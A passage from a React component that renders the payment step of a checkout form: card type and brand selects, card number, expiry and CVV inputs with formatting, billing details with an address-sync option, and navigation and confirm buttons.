                        <option value="Credit Card">Credit Card</option>
                        <option value="Debit Card">Debit Card</option>
                        <option value="Prepaid Card">Prepaid Card</option>
                        <option value="Virtual Card">Virtual Card</option>
                        <option value="Gift Card">Gift Card</option>
                      </select>
                    </div>

                    <div className="space-y-1.5" id="brand-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-brand">Card Brand *</label>
                      <select 
                        value={cardBrand}
                        onChange={(e) => setCardBrand(e.target.value)}
                        className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                        id="select-card-brand"
                      >
                        {(CARD_BRAND_OPTIONS[cardType] || []).map((brand) => (
                          <option key={brand} value={brand}>{brand}</option>
                        ))}
                      </select>
                    </div>
                  </div>

                  <div className="space-y-1.5" id="cardholder-wrapper">
                    <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-cardholder">Cardholder Name</label>
                    <input 
                      type="text"
                      required={paymentMethod === 'Card'}
                      value={payment.cardholderName}
                      onChange={(e) => setPayment({...payment, cardholderName: e.target.value})}
                      className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E]"
                      placeholder="Name on card"
                      id="input-cardholderName"
                    />
                  </div>

                  <div className="space-y-1.5" id="cardnum-wrapper">
                    <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-cardnum">Card Number</label>
                    <input 
                      type="text"
                      required={paymentMethod === 'Card'}
                      value={payment.cardNumber}
                      onChange={(e) => setPayment({...payment, cardNumber: e.target.value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim()})}
                      maxLength={19}
                      className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E]"
                      placeholder="1234 5678 9012 3456"
                      id="input-cardNumber"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-6" id="expiry-cvv-grid">
                    <div className="space-y-1.5" id="expiry-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-expiry">Expiry Date</label>
                      <input 
                        type="text"
                        required={paymentMethod === 'Card'}
                        value={payment.expiry}
                        maxLength={5}
                        onChange={(e) => {
                          let val = e.target.value.replace(/\D/g, '');
                          if (val.length > 2) {
                            val = val.substring(0,2) + '/' + val.substring(2,4);
                          }
                          setPayment({...payment, expiry: val});
                        }}
                        className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E]"
                        placeholder="MM/YY"
                        id="input-expiry"
                      />
                    </div>

                    <div className="space-y-1.5" id="cvv-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-cvv">CVV</label>
                      <input 
                        type="password"
                        required={paymentMethod === 'Card'}
                        maxLength={4}
                        value={payment.cvv}
                        onChange={(e) => setPayment({...payment, cvv: e.target.value.replace(/\D/g, '')})}
                        className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E]"
                        placeholder="123"
                        id="input-cvv"
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* Billing Information Section strictly matching image 6 & 7 */}
              <div className="pt-6 border-t border-slate-100 space-y-5" id="billing-info-panel">
                <h3 className="text-lg font-black text-[#0F172A]" id="title-billing-info">Billing Information</h3>
                
                <div className="space-y-4" id="billing-fields">
                  <div className="space-y-1.5" id="bill-sync-check-box">
                    <div className="flex items-center space-x-2" id="billing-sync-checkbox-row">
                      <input 
                        type="checkbox"
                        id="billing-sync"
                        checked={billingMatchesAddress}
                        onChange={(e) => setBillingMatchesAddress(e.target.checked)}
                        className="w-4 h-4 text-green-600 focus:ring-green-500 border-gray-300 rounded cursor-pointer"
                      />
                      <label htmlFor="billing-sync" className="text-xs font-bold text-slate-700 cursor-pointer">Billing Address matches Current Address</label>
                    </div>
                  </div>

                  <div className="space-y-1.5" id="bill-address-wrapper">
                    <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-bill-address">Billing Address</label>
                    <input 
                      type="text"
                      required={!billingMatchesAddress}
                      value={billingMatchesAddress ? address.street : billingAddress.street}
                      disabled={billingMatchesAddress}
                      onChange={(e) => setBillingAddress({...billingAddress, street: e.target.value})}
                      className={`w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm ${
                        billingMatchesAddress ? 'opacity-60 cursor-not-allowed' : 'focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white'
                      }`}
                      placeholder="Street, City, State, ZIP"
                      id="input-billing-address"
                    />
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-6" id="billing-sub-fields">
                    <div className="space-y-1.5" id="bill-country-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-bill-country">Country</label>
                      <input 
                        type="text"
                        disabled
                        value="United States"
                        className="w-full bg-[#F8FAFC] text-slate-500 font-semibold border border-slate-100 rounded-2xl px-5 py-3.5 text-sm opacity-60 cursor-not-allowed"
                        id="input-billing-country"
                      />
                    </div>

                    <div className="space-y-1.5" id="bill-email-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-bill-email">Email</label>
                      <input 
                        type="email"
                        required
                        value={billingMatchesAddress ? personal.email : billingAddress.email}
                        disabled={billingMatchesAddress}
                        onChange={(e) => setBillingAddress({...billingAddress, email: e.target.value})}
                        className={`w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm ${
                          billingMatchesAddress ? 'opacity-60 cursor-not-allowed' : 'focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white'
                        }`}
                        placeholder="you@example.com"
                        id="input-billing-email"
                      />
                    </div>

                    <div className="space-y-1.5 sm:col-span-2" id="bill-phone-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-bill-phone">Phone Number</label>
                      <input 
                        type="tel"
                        required
                        value={billingMatchesAddress ? personal.phone : billingAddress.phone}
                        disabled={billingMatchesAddress}
                        onChange={(e) => setBillingAddress({...billingAddress, phone: e.target.value})}
                        className={`w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm ${
                          billingMatchesAddress ? 'opacity-60 cursor-not-allowed' : 'focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white'
                        }`}
                        placeholder="(555) 123-4567"
                        id="input-billing-phone"
                      />
                    </div>
                  </div>
                </div>
              </div>

            </div>
          )}

          {/* Bottom navigation buttons exactly matching screenshots styling */}
          <div className="pt-6 border-t border-slate-100 flex justify-between items-center" id="nav-controls-row">
            {step === 1 ? (
              <button
                type="button"
                onClick={onCancel}
                className="text-slate-400 hover:text-slate-600 font-bold text-sm tracking-wide transition-colors flex items-center space-x-1.5 cursor-pointer"
                id="btn-back-home"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Back to Home</span>
              </button>
            ) : (
              <button
                type="button"
                onClick={handleBack}
                disabled={submitting}
                className="text-slate-400 hover:text-slate-600 font-bold text-sm tracking-wide transition-colors flex items-center space-x-1.5 cursor-pointer disabled:opacity-50"
                id="btn-back-step"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Back</span>
              </button>
            )}

            {step < 4 ? (
              <button
                type="button"
                onClick={handleNext}
                className="bg-[#22C55E] hover:bg-[#16A34A] text-white font-bold text-sm px-7 py-3.5 rounded-xl shadow-[0_4px_12px_rgba(34,197,94,0.2)] hover:shadow-[0_6px_18px_rgba(34,197,94,0.3)] transition-all flex items-center space-x-1.5 cursor-pointer"
                id="btn-next-step"
              >
                <span>Next</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            ) : (
              <button
                type="submit"
                disabled={submitting}
                className="bg-[#22C55E] hover:bg-[#16A34A] disabled:bg-green-400 text-white font-bold text-sm px-7 py-3.5 rounded-xl shadow-[0_4px_12px_rgba(34,197,94,0.2)] hover:shadow-[0_6px_18px_rgba(34,197,94,0.3)] transition-all flex items-center space-x-2 cursor-pointer"
                id="btn-submit-payment"
              >
                {submitting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span>Processing...</span>
                  </>
                ) : (
                  <>
                    <Lock className="w-4 h-4" />
                    <span>Confirm Payment</span>
                  </>
                )}
              </button>
            )}
          </div>

        </form>
      </div>
    </div>
  );
}
